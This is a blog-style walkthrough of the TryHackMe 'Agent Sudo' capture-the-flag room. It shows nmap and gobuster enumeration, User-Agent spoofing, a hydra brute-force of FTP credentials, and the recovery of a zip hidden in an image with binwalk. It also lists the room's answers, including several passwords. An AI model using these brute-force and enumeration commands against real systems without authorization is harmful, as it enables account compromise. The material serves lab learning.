---
layout: post
title: Agent Sudo
categories: [CyberSecurity, CTF]
tags: [thm, easy, nmap, gobuster, hydra, exiftool, xxd, binwalk, zip2john, JohnTheRipper, 7z, Cyberchef, steghide]
---
## Task 1: Author Note
Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

## Task 2: Enumerate
Enumerate the machine and get all the important information

### Questions

Q1 How many opens Ports?
```
3
```
Q2 How you redirect yourself to a secret page?
```
user-agent
```
Q3 What is the agent name?
```
chris
```
### MyWalk

Beginning with an **nmap** scan, and save the results on nmap/initial for future reference:

```bash
nmap -T4 -sC -sV -Pn -oN nmap/initial 10.10.188.70
```

Now I try to get the Q2 answer, using **gobuster**:


```bash
gobuster dir --url http://10.10.26.150 -w //usr/share/wordlists/dirb/common.txt | tee gobuster.txt
```

No secret page revealed...  
Hint: Answer format: xxxx-xxxxx  
visiting the page we got:

```
Dear agents,
Use your own codename as user-agent to access the site.

From,
Agent R

```
it seems Q2 is "user-agent"

The hint for Q3:  
"You might face problem on using Firefox. Try 'user agent switcher' plugin with  user agent: C"  
So, let's install user agent switcher plugin, and set the user agent as "C".  After reloading the page I got:
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!


From,

Agent R
```
Now we know the Q3

## Task 3: Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

### Questions
Q1. Hint: "Hail hydra!"  
Q1. FTP password

```
crystal
```

Q2. Zip file password

```
alien
```

Q3. steg password

```
Area51
```

Q4 Who is the other agent (in full name)?

```
james
```

Q5 SSH password

```
hackerrules!
```

### MyWalk

For Q3 lets try **hydra** as sugested by the hint:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.149.150 -t 4
...
[21][ftp] host: 10.10.149.150 login: chris password: crystal
1 of 1 target successfully completed, 1 valid password found
```
Q1 done

Now lets connect to the ftp server with chris:crystal

```bash
└─$ ftp chris@10.10.149.150
Connected to 10.10.149.150.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36713|)
150 Here comes the directory listing.
-rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt
-rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg
-rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png
226 Directory send OK.
ftp>
```

We can´t see any zip file refered in Q2
After dowloading the 3 files and opened the To_agentJ.txt we got...

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,

Agent C
```

So we need to use **exiftool** to extract login password.

[https://exiftool.org/examples.html](https://exiftool.org/examples.html)  


```bash
└─$ exiftool cute-alien.jpg
ExifTool Version Number : 12.67
File Name : cute-alien.jpg
Directory : .
File Size : 33 kB
File Modification Date/Time : 2019:10:29 08:22:37-04:00
File Access Date/Time : 2024:01:10 11:49:00-05:00
File Inode Change Date/Time : 2024:01:10 11:49:00-05:00
File Permissions : -rw-r--r--
File Type : JPEG
File Type Extension : jpg
MIME Type : image/jpeg
JFIF Version : 1.01
Resolution Unit : inches
X Resolution : 96
Y Resolution : 96
Image Width : 440
Image Height : 501
Encoding Process : Baseline DCT, Huffman coding
Bits Per Sample : 8
Color Components : 3
Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2)
Image Size : 440x501
Megapixels : 0.220
```

```bash
└─$ exiftool cutie.png
ExifTool Version Number : 12.67
File Name : cutie.png
Directory : .
File Size : 35 kB
File Modification Date/Time : 2019:10:29 08:33:51-04:00
File Access Date/Time : 2024:01:10 11:49:17-05:00
File Inode Change Date/Time : 2024:01:10 11:49:17-05:00
File Permissions : -rw-r--r--
File Type : PNG
File Type Extension : png
MIME Type : image/png
Image Width : 528
Image Height : 528
Bit Depth : 8
Color Type : Palette
Compression : Deflate/Inflate
Filter : Adaptive
Interlace : Noninterlaced
Palette : (Binary data 762 bytes, use -b option to extract)
Transparency : (Binary data 42 bytes, use -b option to extract)
Warning : [minor] Trailer data after PNG IEND chunk
Image Size : 528x528
Megapixels : 0.279
```
Aparently, no useful info!

Tried the -b option to extract binaries and the interesting info is: "Trailer data after PNG IEND chunk528 5280.278784".  
Found this site: [https://afnom.net/wtctf/2019/magic/](https://afnom.net/wtctf/2019/magic/)  
after installing **xxd**, tried:

```bash
xxd cutie.png
```

At the end of the file, found...  

```bash
000086f0: 2ec1 e5de 8c38 0000 0000 4945 4e44 ae42 .....8....IEND.B
00008700: 6082 504b 0304 3303 0100 6300 a6a3 5d4f `.PK..3...c...]O
00008710: 0000 0000 6200 0000 5600 0000 0d00 0b00 ....b...V.......
00008720: 546f 5f61 6765 6e74 522e 7478 7401 9907 To_agentR.txt...
00008730: 0002 0041 4501 0800 4673 cae7 1457 9045 ...AE...Fs...W.E
00008740: 67aa 61c4 cf3a f94e 649f 827e 5964 ce57 g.a..:.Nd..~Yd.W
00008750: 5c5f 7a23 9c48 fb99 2c8e a8cb ffe5 1d03 \_z#.H..,.......
00008760: 755e 0ca8 61a5 a3dc babf a618 784b 8507 u^..a.......xK..
00008770: 5f0e f476 c6da 8261 805b d0a4 309d b388 _..v...a.[..0...
00008780: 35ad 3261 3e3d c5d7 e87c 0f91 c0b5 e64e 5.2a>=...|.....N
00008790: 4969 f382 486c b676 7ae6 504b 0102 3f03 Ii..Hl.vz.PK..?.
000087a0: 3303 0100 6300 a6a3 5d4f 0000 0000 6200 3...c...]O....b.
000087b0: 0000 5600 0000 0d00 2f00 0000 0000 0000 ..V...../.......
000087c0: 2080 a481 0000 0000 546f 5f61 6765 6e74 .......To_agent
000087d0: 522e 7478 740a 0020 0000 0000 0001 0018 R.txt.. ........
000087e0: 0080 4577 7754 8ed5 0100 65da d354 8ed5 ..EwwT....e..T..
000087f0: 0100 65da d354 8ed5 0101 9907 0002 0041 ..e..T.........A
00008800: 4501 0800 504b 0506 0000 0000 0100 0100 E...PK..........
00008810: 6a00 0000 9800 0000 0000 j.........
```

To_agentR.txt

Lets use **binwalk** to extract this txt file from the cutie.png...

```bash
└─$ binwalk cutie.png
DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced
869 0x365 Zlib compressed data, best compression
34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820 0x8804 End of Zip archive, footer length: 22
```

Now with **-e** option...

```bash
└─$ binwalk -e cutie.png
DECIMAL HEXADECIMAL DESCRIPTION
--------------------------------------------------------------------------------
0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced
869 0x365 Zlib compressed data, best compression
WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820 0x8804 End of Zip archive, footer length: 22
┌──(kali㉿kali)-[~/…/hellbender/thm/rooms/Agent Sudo]
└─$ ll
total 96
-rw-r--r-- 1 kali kali 6678 Jan 10 13:36 agent_sudo.md
-rw-r--r-- 1 kali kali 33143 Jan 10 13:36 cute-alien.jpg
-rw-r--r-- 1 kali kali 34842 Jan 10 13:36 cutie.png
drwxr-xr-x 2 kali kali 4096 Jan 10 14:19 _cutie.png.extracted
-rw-r--r-- 1 kali kali 1072 Jan 10 13:36 gobuster.txt
drwxr-xr-x 2 kali kali 4096 Jan 10 13:36 nmap
-rw-r--r-- 1 kali kali 217 Jan 10 13:36 To_agentJ.txt
┌──(kali㉿kali)-[~/…/hellbender/thm/rooms/Agent Sudo]
└─$ cd _cutie.png.extracted
┌──(kali㉿kali)-[~/…/thm/rooms/Agent Sudo/_cutie.png.extracted]
└─$ ls
365 365.zlib 8702.zip To_agentR.txt
```